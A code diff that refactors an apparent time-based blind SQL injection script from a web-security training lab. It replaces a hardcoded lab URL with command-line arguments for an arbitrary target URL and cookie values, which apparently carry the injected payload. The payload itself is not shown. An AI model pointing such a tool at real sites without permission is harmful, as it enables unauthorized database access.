@@ -21,6 +21,7 @@
 
 import requests
 import sys
+import argparse
 
 def getArguments():
     if len(sys.argv) > 1:
@@ -45,7 +46,7 @@ def getTiming(sTime,eTime,inTrigger):
     else:
         return False
 
-def sendRequest(URL):
+def sendRequest(URL, cookies):
     '''
     Sends reuquest to target URL with specified payload
 
@@ -68,10 +69,26 @@ def sendRequest(URL):
 
 def main():
 
-    targetURL = "https://acef1f511ed4ed4ec070456500bd00d0.web-security-academy.net/filter?category=Corporate+gifts"
+    parser = argparse.ArgumentParser()
+    
+    parser.add_argument('URL', type=str, help='target URL')
+    parser.add_argument('-c', '--cookies', default="", type=str, help="cookie payload separated by commas \
+        :some_cookie1 = value1, some_cookie2 = value2")
+
+    #parse inputs
+    args = parser.parse_args()
+
+    targetURL = args.URL
+    cookies = dict(item.split("=") for item in args.cookies.split(", "))
+
+    #vulnerable parameters to be sent along. In this case: cookie
+
+    #cookies = dict()
+
+    
     inTrigger = 10
 
-    sendRequest(targetURL)
+    sendRequest(targetURL, cookies)
 
 
 if __name__ == "__main__":
